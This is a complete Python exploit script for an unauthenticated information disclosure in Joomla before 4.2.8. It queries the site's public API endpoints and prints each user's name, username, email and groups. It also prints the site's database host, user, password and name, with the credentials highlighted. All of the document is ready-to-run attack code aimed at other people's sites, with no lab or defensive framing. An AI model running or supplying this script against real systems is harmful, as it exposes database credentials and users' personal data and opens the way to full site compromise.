#!/usr/bin/env python3

import json
import sys
import argparse
import requests

def fetch_users(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
    response = requests.get(vuln_url)
    return response.json()

def parse_users(root_url):
    data_json = fetch_users(root_url)
    data = data_json.get('data', [])
    users = []
    for user in data:
        if user.get('type') == 'users':
            attributes = user.get('attributes', {})
            id = attributes.get('id')
            name = attributes.get('name')
            username = attributes.get('username')
            email = attributes.get('email')
            groups = attributes.get('group_names')
            users.append({'id': id, 'name': name, 'username': username, 'email': email, 'groups': groups})
    return users

def display_users(root_url):
    users = parse_users(root_url)
    print("\033[1mUsers\033[0m")
    for user in users:
        print(f"[{user['id']}] {user['name']} (\033[93m{user['username']}\033[0m) - {user['email']} - {user['groups']}")

def fetch_config(root_url):
    vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
    response = requests.get(vuln_url)
    return response.json()

def parse_config(root_url):
    data_json = fetch_config(root_url)
    data = data_json.get('data', [])
    config = {}
    for entry in data:
        if entry.get('type') == 'application':
            attributes = entry.get('attributes', {})
            key = list(attributes.keys())[0]
            config[key] = attributes[key]
    return config

def display_config(root_url):
    c = parse_config(root_url)
    print("\033[1mSite info\033[0m")
    print(f"Site name: {c.get('sitename')}")
    print(f"Editor: {c.get('editor')}")
    print(f"Captcha: {c.get('captcha')}")
    print(f"Access: {c.get('access')}")
    print(f"Debug status: {c.get('debug')}\n")
    print("\033[1mDatabase info\033[0m")
    print(f"DB type: {c.get('dbtype')}")
    print(f"DB host: {c.get('host')}")
    print(f"DB user: \033[93m\033[1m{c.get('user')}\033[0m")
    print(f"DB password: \033[93m\033[1m{c.get('password')}\033[0m")
    print(f"DB name: {c.get('db')}")
    print(f"DB prefix: {c.get('dbprefix')}")
    print(f"DB encryption {c.get('dbencryption')}")

def main():
    parser = argparse.ArgumentParser(description='Joomla! < 4.2.8 - Unauthenticated information disclosure')
    parser.add_argument('url', help='Root URL (base path) including HTTP scheme, port, and root folder')
    args = parser.parse_args()

    display_users(args.url)
    print()
    display_config(args.url)

if __name__ == "__main__":
    main()
